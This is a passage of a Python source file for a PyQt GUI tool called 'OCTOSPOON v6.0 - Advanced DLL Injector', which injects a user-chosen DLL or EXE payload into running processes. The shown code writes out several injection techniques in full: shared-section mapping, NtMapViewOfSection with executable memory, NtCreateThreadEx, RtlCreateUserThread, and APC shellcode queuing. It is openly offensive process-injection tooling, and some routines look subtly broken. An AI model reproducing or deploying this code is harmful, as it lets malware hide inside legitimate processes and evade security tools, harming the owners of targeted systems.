        h_mapping = kernel32.CreateFileMappingW(INVALID_HANDLE_VALUE, None, PAGE_READWRITE, 0, len(dll_path_bytes), section_name)
        if not h_mapping:
            kernel32.CloseHandle(h_process)
            raise Exception("Failed to create file mapping")
        
        # Write DLL path to shared memory
        map_view = kernel32.MapViewOfFile(h_mapping, FILE_MAP_WRITE, 0, 0, len(dll_path_bytes))
        if map_view:
            ctypes.memmove(map_view, dll_path_bytes, len(dll_path_bytes))
            kernel32.UnmapViewOfFile(map_view)
        
        # Open section in remote process
        remote_section = kernel32.OpenFileMappingW(FILE_MAP_READ, False, section_name)
        if not remote_section:
            kernel32.CloseHandle(h_mapping)
            kernel32.CloseHandle(h_process)
            raise Exception("Failed to open file mapping in remote process")
        
        remote_view = kernel32.MapViewOfFile(remote_section, FILE_MAP_READ, 0, 0, len(dll_path_bytes))
        if not remote_view:
            kernel32.CloseHandle(remote_section)
            kernel32.CloseHandle(h_mapping)
            kernel32.CloseHandle(h_process)
            raise Exception("Failed to map view in remote process")
        
        loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
        
        thread_id = wintypes.DWORD(0)
        h_thread = kernel32.CreateRemoteThread(h_process, None, 0, loadlib, remote_view, 0, byref(thread_id))
        
        if h_thread:
            kernel32.WaitForSingleObject(h_thread, INFINITE)
            kernel32.CloseHandle(h_thread)
            self.log("PowerLoader injection completed")
        else:
            raise Exception("Failed to create remote thread")
        
        kernel32.CloseHandle(remote_section)
        kernel32.CloseHandle(h_mapping)
        kernel32.CloseHandle(h_process)

    # === 13. Section Mapping ===
    def section_mapping_injection(self):
        self.log("Starting Section Mapping Injection...")
        
        with open(self.dll_path, 'rb') as f:
            dll_data = f.read()
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        
        # Create executable heap
        executable_heap = kernel32.HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, len(dll_data), 0)
        local_mem = kernel32.HeapAlloc(executable_heap, HEAP_ZERO_MEMORY, len(dll_data))
        if local_mem:
            ctypes.memmove(local_mem, dll_data, len(dll_data))
        
        # Create section and map to remote process
        section_handle = wintypes.HANDLE(0)
        max_size = wintypes.LARGE_INTEGER(len(dll_data))
        
        status = ntdll.NtCreateSection(byref(section_handle), SECTION_ALL_ACCESS, None, byref(max_size), PAGE_EXECUTE_READWRITE, 0x8000000, None)
        
        remote_base = c_void_p(0)
        view_size = ctypes.c_size_t(len(dll_data))
        ntdll.NtMapViewOfSection(section_handle, h_process, byref(remote_base), 0, 0, None, byref(view_size), 1, 0, PAGE_EXECUTE_READWRITE)
        
        # Copy DLL data
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_base, dll_data, len(dll_data), byref(bytes_written))
        
        # Get entry point
        e_lfanew = struct.unpack_from("<I", dll_data, 0x3C)[0]
        entry_rva = struct.unpack_from("<I", dll_data, e_lfanew + 0x28)[0]
        remote_entry = remote_base.value + entry_rva
        
        # Execute via NtCreateThreadEx
        h_thread = wintypes.HANDLE(0)
        ntdll.NtCreateThreadEx(byref(h_thread), THREAD_ALL_ACCESS, None, h_process, remote_entry, None, 0, 0, 0, 0, None)
        
        kernel32.WaitForSingleObject(h_thread, INFINITE)
        kernel32.CloseHandle(h_thread)
        kernel32.CloseHandle(section_handle)
        kernel32.CloseHandle(h_process)
        
        self.log("Section mapping injection completed")

    # === 14. NtCreateThreadEx ===
    def ntcreatethread_injection(self):
        self.log("Starting NtCreateThreadEx Injection...")
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        
        dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
        remote_mem = kernel32.VirtualAllocEx(h_process, None, len(dll_path_bytes), MEM_COMMIT_RESERVE, PAGE_READWRITE)
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_mem, dll_path_bytes, len(dll_path_bytes), byref(bytes_written))
        
        loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
        
        h_thread = wintypes.HANDLE(0)
        status = ntdll.NtCreateThreadEx(byref(h_thread), THREAD_ALL_ACCESS, None, h_process, loadlib, remote_mem, 0, 0, 0, 0, None)
        
        if status == 0 and h_thread:
            kernel32.WaitForSingleObject(h_thread, INFINITE)
            kernel32.CloseHandle(h_thread)
            self.log("NtCreateThreadEx injection completed")
        else:
            raise Exception(f"NtCreateThreadEx failed: 0x{status:X}")
        
        kernel32.CloseHandle(h_process)

    # === 15. RtlCreateUserThread ===
    def rtlcreateuserthread_injection(self):
        self.log("Starting RtlCreateUserThread Injection...")
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        
        dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
        remote_mem = kernel32.VirtualAllocEx(h_process, None, len(dll_path_bytes), MEM_COMMIT_RESERVE, PAGE_READWRITE)
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_mem, dll_path_bytes, len(dll_path_bytes), byref(bytes_written))
        
        loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
        
        h_thread = wintypes.HANDLE(0)
        client_id = CLIENT_ID()
        
        status = ntdll.RtlCreateUserThread(h_process, None, False, 0, None, None, loadlib, remote_mem, byref(h_thread), byref(client_id))
        
        if status == 0 and h_thread:
            kernel32.WaitForSingleObject(h_thread, INFINITE)
            kernel32.CloseHandle(h_thread)
            self.log("RtlCreateUserThread injection completed")
        else:
            raise Exception(f"RtlCreateUserThread failed: 0x{status:X}")
        
        kernel32.CloseHandle(h_process)

        # === 16. NtTestAlert ===
    def ntalert_injection(self):
        self.log("Starting NtTestAlert Injection...")
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        
        dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
        remote_mem = kernel32.VirtualAllocEx(h_process, None, len(dll_path_bytes), MEM_COMMIT_RESERVE, PAGE_READWRITE)
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_mem, dll_path_bytes, len(dll_path_bytes), byref(bytes_written))
        
        loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
        
        # Get NtTestAlert from ntdll
        nt_test_alert = kernel32.GetProcAddress(ntdll._handle, b"NtTestAlert")
        
        # Build shellcode with NtTestAlert call
        shellcode = build_loadlibrary_shellcode(remote_mem, loadlib, nt_test_alert if nt_test_alert else 0)
        
        remote_shellcode = kernel32.VirtualAllocEx(h_process, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        kernel32.WriteProcessMemory(h_process, remote_shellcode, shellcode, len(shellcode), byref(bytes_written))
        
        # Queue APC to threads
        queued = 0
        try:
            process = psutil.Process(self.pid)
            for thread in process.threads():
                h_thread = kernel32.OpenThread(THREAD_ALL_ACCESS, False, thread.id)
                if h_thread:
                    if kernel32.QueueUserAPC(remote_shellcode, h_thread, 0):
                        queued += 1
                    kernel32.CloseHandle(h_thread)
        except:
            pass
        
        kernel32.CloseHandle(h_process)
        self.log(f"NtTestAlert APCs queued: {queued}")


# === GUI ===
class OctoSpoonGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("OCTOSPOON v6.0 - Advanced DLL Injector")
        self.setGeometry(100, 100, 1000, 700)
        self.setStyleSheet("""
            QMainWindow { background-color: #1a1a1a; }
            QLabel { color: #e0e0e0; font-family: 'Consolas', 'Courier New', monospace; }
            QComboBox { background-color: #2d2d2d; color: #e0e0e0; border: 1px solid #555; padding: 5px; }
            QPushButton { background-color: #3d3d3d; color: #e0e0e0; border: 1px solid #555; padding: 8px; }
            QPushButton:hover { background-color: #4d4d4d; }
            QListWidget { background-color: #2d2d2d; color: #e0e0e0; border: 1px solid #555; }
            QTextEdit { background-color: #0d0d0d; color: #00ff41; border: 1px solid #555; font-size: 12px; }
            QProgressBar { background-color: #2d2d2d; border: 1px solid #555; }
            QCheckBox { color: #e0e0e0; }
        """)
        self.init_ui()

    def init_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        layout.setSpacing(10)
        layout.setContentsMargins(15, 15, 15, 15)

        # Title
        title = QLabel("OCTOSPOON v6.0 - Advanced DLL Injector")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setFont(QFont("Consolas", 18, QFont.Weight.Bold))
        title.setStyleSheet("color: #00ff41; margin: 10px;")
        layout.addWidget(title)
        
        subtitle = QLabel("16 Advanced Injection Techniques | x64 Architecture")
        subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
        subtitle.setFont(QFont("Consolas", 11))
        subtitle.setStyleSheet("color: #888; margin-bottom: 10px;")
        layout.addWidget(subtitle)

        splitter = QSplitter()
        layout.addWidget(splitter)

        # Left Panel
        left = QWidget()
        left_layout = QVBoxLayout(left)
        left_layout.setSpacing(10)

        # Method Selection
        method_label = QLabel("Method:")
        method_label.setStyleSheet("font-weight: bold; color: #00ff41;")
        left_layout.addWidget(method_label)
        
        self.method_combo = QComboBox()
        self.method_combo.addItems([
            "Standard", "APC", "Early Bird", "Thread Hijack",
            "Reflective", "Manual Map", "Process Hollowing",
            "Thread Pool", "Kernel Driver", "AtomBombing",
            "SetHook", "PowerLoader", "Section Mapping",
            "NtCreateThread", "RtlCreateUserThread", "NtAlert"
        ])
        left_layout.addWidget(self.method_combo)

        # Target Process
        target_label = QLabel("Target Process:")
        target_label.setStyleSheet("font-weight: bold; color: #00ff41; margin-top: 10px;")
        left_layout.addWidget(target_label)
        
        t_layout = QHBoxLayout()
        self.pid_list = QListWidget()
        self.pid_list.setMaximumHeight(150)
        self.refresh_btn = QPushButton("Refresh")
        self.refresh_btn.clicked.connect(self.refresh_pids)
        t_layout.addWidget(self.pid_list)
        t_layout.addWidget(self.refresh_btn)
        left_layout.addLayout(t_layout)

        # Payload
        payload_label = QLabel("Payload:")
        payload_label.setStyleSheet("font-weight: bold; color: #00ff41; margin-top: 10px;")
        left_layout.addWidget(payload_label)
        
        p_layout = QHBoxLayout()
        self.payload_label = QLabel("No file selected")
        self.payload_label.setStyleSheet("color: #888; border: 1px solid #555; padding: 5px;")
        self.browse_btn = QPushButton("Browse")
        self.browse_btn.clicked.connect(self.browse_payload)
        p_layout.addWidget(self.payload_label)
        p_layout.addWidget(self.browse_btn)
        left_layout.addLayout(p_layout)

        # Progress Bar
        self.progress = QProgressBar()
        self.progress.setVisible(False)
        self.progress.setTextVisible(False)
        left_layout.addWidget(self.progress)

        # Inject Button
        self.inject_btn = QPushButton("INJECT")
        self.inject_btn.setStyleSheet("""
            QPushButton {
                background-color: #00ff41; color: black; font-weight: bold;
                padding: 12px; border-radius: 5px; font-size: 14px; margin-top: 10px;
            }
            QPushButton:hover { background-color: #00cc33; }
            QPushButton:pressed { background-color: #009922; }
            QPushButton:disabled { background-color: #555; color: #888; }
        """)
        self.inject_btn.clicked.connect(self.start_injection)
        left_layout.addWidget(self.inject_btn)

        left_layout.addStretch()
        splitter.addWidget(left)

        # Right Panel - Log
        log_label = QLabel("Console Output:")
        log_label.setStyleSheet("font-weight: bold; color: #00ff41;")
        
        right = QWidget()
        right_layout = QVBoxLayout(right)
        right_layout.addWidget(log_label)
        
        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        right_layout.addWidget(self.log_box)
        splitter.addWidget(right)

        splitter.setSizes([350, 650])
        
        self.refresh_pids()
        self.log("OCTOSPOON v6.0 initialized - 16 injection methods available")
        self.log("Ready for injection...")

    def log(self, msg):
        self.log_box.append(msg)
        scrollbar = self.log_box.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())

    def refresh_pids(self):
        self.pid_list.clear()
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    pid = proc.info['pid']
                    name = proc.info['name']
                    if pid > 4:
                        self.pid_list.addItem(f"[{pid:5d}] {name}")
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        except Exception as e:
            self.log(f"[!] Error: {e}")
        
        self.log(f"[*] Process list refreshed")

    def browse_payload(self):
        path, _ = QFileDialog.getOpenFileName(
            self, "Select Payload", "", 
            "DLL/EXE Files (*.dll *.exe);;All Files (*.*)"
        )
        if path:
            self.payload_label.setText(os.path.basename(path))
            self.payload_label.setToolTip(path)
            self.payload_label.full_path = path
            self.log(f"[*] Payload: {os.path.basename(path)}")

    def start_injection(self):
        # Check admin
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                QMessageBox.warning(self, "Warning", "Run as Administrator for best results!")
        except:
            pass
        
        method = self.method_combo.currentText()
        
        if method in ["Early Bird", "Process Hollowing"]:
            exe_path, _ = QFileDialog.getOpenFileName(self, "Select Host EXE", "", "EXE (*.exe)")
            if not exe_path:
                return
            pid = None
            dll_path = getattr(self.payload_label, 'full_path', None)
        elif method == "Kernel Driver":
            pid = None
            dll_path = None
            exe_path = None
        else:
            current_item = self.pid_list.currentItem()
            if not current_item:
                QMessageBox.warning(self, "Error", "Select target process")
                return
            try:
                pid_text = current_item.text().split(']')[0][1:].strip()
                pid = int(pid_text)
            except:
                QMessageBox.warning(self, "Error", "Invalid process")
                return
            dll_path = getattr(self.payload_label, 'full_path', None)
            if not dll_path:
                QMessageBox.warning(self, "Error", "Select payload DLL")
                return
            exe_path = None
        
        self.inject_btn.setEnabled(False)
        self.inject_btn.setText("Injecting...")
        self.progress.setVisible(True)
        self.progress.setRange(0, 0)
        
        self.thread = InjectorThread(method, pid, dll_path, exe_path)
        self.thread.log_signal.connect(self.log)
        self.thread.error_signal.connect(lambda msg: self.log(msg))
        self.thread.done_signal.connect(self.injection_done)
        self.thread.start()

    def injection_done(self, msg):
        self.progress.setVisible(False)
        self.progress.setRange(0, 100)
        self.inject_btn.setEnabled(True)
        self.inject_btn.setText("INJECT")
        self.log(msg)
        self.log("-" * 50)


# === Main ===
if __name__ == "__main__":
    try:
        app = QApplication(sys.argv)
        window = OctoSpoonGUI()
        window.show()
        sys.exit(app.exec())
    except Exception as e:
        print(f"Error: {e}")
        input("Press Enter to exit...")
        sys.exit(1)
